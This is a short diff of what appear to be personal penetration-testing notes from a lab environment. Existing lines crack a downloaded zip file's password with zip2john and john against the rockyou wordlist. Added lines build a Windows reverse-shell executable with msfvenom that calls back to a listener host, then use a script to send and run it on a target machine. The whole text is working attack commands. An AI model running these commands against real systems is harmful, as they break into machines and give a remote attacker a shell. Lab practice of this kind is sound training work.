@@ -16,3 +16,7 @@ downloaded bank-account.zip
 		zip2john bank-account.zip > hash
 		john --wordlist=/usr/share/wordlists/rockyou.txt
 		pw = alice
+
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.159 LPORT=9001 -f exe -o test.exe
+python2 send_and_execute.py 10.11.1.227 test.exe
